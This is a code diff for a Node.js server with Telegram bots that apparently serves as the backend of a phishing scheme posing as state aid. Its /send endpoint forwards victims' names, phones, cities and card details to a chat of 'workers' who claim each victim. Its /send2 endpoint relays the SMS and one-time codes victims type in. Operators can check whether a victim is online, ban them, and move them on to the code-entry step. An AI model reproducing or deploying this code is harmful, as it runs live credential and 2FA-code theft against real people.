@@ -15,7 +15,7 @@ const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
   polling: true
 });
 
-const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);
+const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN); // БЕЗ polling
 
 // ===== ENV =====
 const adminId = Number(process.env.ADMIN_CHAT_ID);
@@ -29,44 +29,13 @@ let seenUsers = {};
 let onlineUsers = {};
 let bannedUsers = {};
 let userStatus = {};
-let moderators = {}; // ref -> { id, username }
-
-// ===== ГЕНЕРАЦИЯ REF =====
-function generateRef(){
-  return Math.random().toString(36).substring(2,8);
-}
+let requestOwner = {}; // 🔥 кто привёл
 
 // ===== ONLINE =====
 function isOnline(id) {
   if (!onlineUsers[id]) return false;
   return Date.now() - onlineUsers[id] < 20000;
 }
-
-// ===== ДОБАВИТЬ МОДЕРА (ответом) =====
-workerBot.onText(/\/addmod/, (msg) => {
-  if (msg.chat.id !== adminId) return;
-
-  const user = msg.reply_to_message?.from;
-
-  if (!user) {
-    return workerBot.sendMessage(adminId,
-"❗ Ответь на сообщение человека командой /addmod");
-  }
-
-  const ref = generateRef();
-
-  moderators[ref] = {
-    id: user.id,
-    username: user.username || null,
-    name: user.first_name
-  };
-
-  workerBot.sendMessage(adminId,
-`✅ Модератор добавлен
-
- ${user.username ? "@" + user.username : user.first_name}
-🔗 https://dopomogavidderzhavii.vercel.app/?ref=${ref}`);
-});
 
 // ===== ВХОД =====
 app.post("/enter", (req, res) => {
@@ -89,28 +58,23 @@ app.post("/ping", (req, res) => {
 
 // ===== ЗАЯВКА =====
 app.post("/send", (req, res) => {
-  const d = req.body;
-  const id = d.clientId;
+  try {
+    const d = req.body;
+    const id = d.clientId;
 
-  if (!id) return res.json({ ok: false });
-  if (bannedUsers[id]) return res.json({ ok: false });
+    if (!id) return res.json({ ok: false });
+    if (bannedUsers[id]) return res.json({ ok: false });
 
-  const isRepeat = seenUsers[id];
-  seenUsers[id] = true;
+    const isRepeat = seenUsers[id];
+    seenUsers[id] = true;
 
-  const statusText = isRepeat ? "Повторный Лог♻️" : "👻Новый Лог🔥";
+    const statusText = isRepeat ? "Повторный Лог♻️" : "🔥 Новый Лог 👻";
 
-  const ref = d.ref;
-  let modText = "—";
+    const moderator = d.refUser || "неизвестно";
 
-  if (ref && moderators[ref]) {
-    const mod = moderators[ref];
-    modText = mod.username ? "@" + mod.username : mod.name;
-  }
+    const fullText = `${statusText} Лог
 
-  const fullText = `${statusText}
-
-🆔 ID: ${id}
+🆔 ${id}
 
 🏧 ${d.service}
 🗝️ ${d.name}
@@ -119,26 +83,32 @@ app.post("/send", (req, res) => {
 ⛓️‍💥 ${d.city}
 💳 ${d.comment}
 
-: ${modText}`;
+: ${moderator}`;
 
-  const shortText = `🏧 ${d.service}
-🏧 ${d.service}
+    const shortText = `${statusText}
+
+📦 ${d.service}
 📱 ${d.phone}
 
- ${modText}`;
+ ${moderator}`;
 
-  fullRequests[id] = fullText;
-  shortRequests[id] = shortText;
+    fullRequests[id] = fullText;
+    shortRequests[id] = shortText;
+    requestOwner[id] = moderator;
 
-  workerBot.sendMessage(workerChat, shortText, {
-    reply_markup: {
-      inline_keyboard: [
-        [{ text: "📥 Забрать", callback_data: "take_" + id }]
-      ]
-    }
-  });
+    workerBot.sendMessage(workerChat, shortText, {
+      reply_markup: {
+        inline_keyboard: [
+          [{ text: "📥 Забрать", callback_data: "take_" + id }]
+        ]
+      }
+    }).catch(()=>{});
 
-  res.json({ ok: true, id });
+    res.json({ ok: true });
+
+  } catch (e) {
+    res.json({ ok: false });
+  }
 });
 
 // ===== СТАТУС =====
@@ -148,86 +118,143 @@ app.get("/status/:id", (req, res) => {
 
 // ===== ДОП ДАННЫЕ =====
 app.post("/send2", (req, res) => {
-  const data = req.body;
-  const id = data.id;
+  try {
+    const id = req.body.id;
+    const value = req.body.value;
 
-  if (!id) return res.json({ ok: false });
+    if (!id || !value) return res.json({ ok: false });
 
-  const who = takenRequests[id];
-  if (!who) return res.json({ ok: false });
+    const owner = takenRequests[id];
 
-  workerBot.sendMessage(who,
-`📩 SMS/CODE 
+    if (!owner) return res.json({ ok: true });
 
-🆔 ${id}
-💬 ${data.value}`).catch(()=>{});
+    workerBot.sendMessage(owner, `📩 SMS/CODE\n\n${value}`).catch(()=>{});
 
-  res.json({ ok: true });
+    res.json({ ok: true });
+
+  } catch {
+    res.json({ ok: false });
+  }
 });
 
 // ===== CALLBACK =====
 workerBot.on("callback_query", async (q) => {
-  const data = q.data;
-  const id = data.split("_")[1];
+  try {
+    const data = q.data;
+    const id = data.split("_")[1];
 
-  if (data.startsWith("take")) {
+    // ===== ЗАБРАТЬ =====
+    if (data.startsWith("take")) {
 
-    if (takenRequests[id]) {
-      return workerBot.answerCallbackQuery(q.id, {
-        text: "❌ Уже занято"
+      if (takenRequests[id]) {
+        return workerBot.answerCallbackQuery(q.id, {
+          text: "❌ Уже занято"
+        });
+      }
+
+      takenRequests[id] = q.from.id;
+
+      const username = q.from.username
+        ? "@" + q.from.username
+        : q.from.first_name;
+
+      // меняем сообщение в чате
+      await workerBot.editMessageText(
+        shortRequests[id] + `\n\n Взял: ${username}`,
+        {
+          chat_id: q.message.chat.id,
+          message_id: q.message.message_id,
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "🔓 Отпустить", callback_data: "release_" + id }]
+            ]
+          }
+        }
+      );
+
+      // отправляем в личку
+      workerBot.sendMessage(q.from.id, fullRequests[id], {
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
+            [
+              { text: "🚫 Бан", callback_data: "ban_" + id },
+              { text: "✅ Разбан", callback_data: "unban_" + id }
+            ],
+            [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
+          ]
+        }
+      }).catch(()=>{});
+
+      workerBot.answerCallbackQuery(q.id);
+    }
+
+    // ===== ОТПУСТИТЬ =====
+    if (data.startsWith("release")) {
+
+      if (takenRequests[id] !== q.from.id) {
+        return workerBot.answerCallbackQuery(q.id, {
+          text: "❌ Не твой"
+        });
+      }
+
+      delete takenRequests[id];
+
+      await workerBot.editMessageText(
+        shortRequests[id],
+        {
+          chat_id: q.message.chat.id,
+          message_id: q.message.message_id,
+          reply_markup: {
+            inline_keyboard: [
+              [{ text: "📥 Забрать", callback_data: "take_" + id }]
+            ]
+          }
+        }
+      );
+
+      workerBot.answerCallbackQuery(q.id, {
+        text: "✅ Освобождено"
       });
     }
 
-    takenRequests[id] = q.from.id;
+    // ===== ОНЛАЙН =====
+    if (data.startsWith("check")) {
+      workerBot.answerCallbackQuery(q.id, {
+        text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
+      });
+    }
 
-    try {
-      await workerBot.editMessageText(
-        shortRequests[id] + `\n\n✅ Забрал: ${q.from.username ? "@" + q.from.username : q.from.first_name}`,
-        {
-          chat_id: q.message.chat.id,
-          message_id: q.message.message_id
-        }
-      );
-    } catch {}
+    // ===== БАН =====
+    if (data.startsWith("ban")) {
+      bannedUsers[id] = true;
+      workerBot.answerCallbackQuery(q.id);
+    }
 
-    workerBot.sendMessage(q.from.id, fullRequests[id], {
-      reply_markup: {
-        inline_keyboard: [
-          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
-          [
-            { text: "🚫 Бан", callback_data: "ban_" + id },
-            { text: "✅ Разбан", callback_data: "unban_" + id }
-          ],
-          [{ text: "➡️ SMS/CODE", callback_data: "allow_" + id }]
-        ]
-      }
-    });
+    // ===== РАЗБАН =====
+    if (data.startsWith("unban")) {
+      delete bannedUsers[id];
+      workerBot.answerCallbackQuery(q.id);
+    }
 
-    workerBot.answerCallbackQuery(q.id);
-  }
+    // ===== ДАЛЬШЕ =====
+    if (data.startsWith("allow")) {
+      userStatus[id] = "next";
+      workerBot.answerCallbackQuery(q.id, {
+        text: "➡️ SMS/CODE"
+      });
+    }
 
-  if (data.startsWith("check")) {
-    workerBot.answerCallbackQuery(q.id, {
-      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
-    });
-  }
-
-  if (data.startsWith("ban")) {
-    bannedUsers[id] = true;
-    workerBot.answerCallbackQuery(q.id);
-  }
-
-  if (data.startsWith("unban")) {
-    delete bannedUsers[id];
-    workerBot.answerCallbackQuery(q.id);
-  }
-
-  if (data.startsWith("allow")) {
-    userStatus[id] = "next";
-    workerBot.answerCallbackQuery(q.id);
+  } catch (e) {
+    console.log("ERR:", e.message);
   }
 });
 
+// ===== АНТИКРАШ =====
+process.on("uncaughtException", (e) => console.log("CRASH:", e));
+process.on("unhandledRejection", (e) => console.log("REJECT:", e));
+
+// ===== СТАРТ =====
 app.listen(process.env.PORT || 3000, () => {
   console.log("SERVER OK");
 });
